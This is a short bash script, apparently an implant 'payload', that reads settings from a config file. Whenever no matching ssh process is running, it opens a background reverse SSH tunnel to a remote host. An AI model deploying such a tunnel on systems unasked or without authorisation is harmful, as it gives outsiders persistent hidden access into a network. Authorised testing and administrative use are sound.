#!/bin/bash

source config

if [ "$SSH" = "yes" ] && [ "`ps aux | grep $SSH_user@$SSH_host | grep ssh`" = "" ]; then
  echo "RUNNING PAYLOAD_SSH"
  ssh -N -f -R $SSH_rev -p $SSH_port $SSH_user@$SSH_host
fi
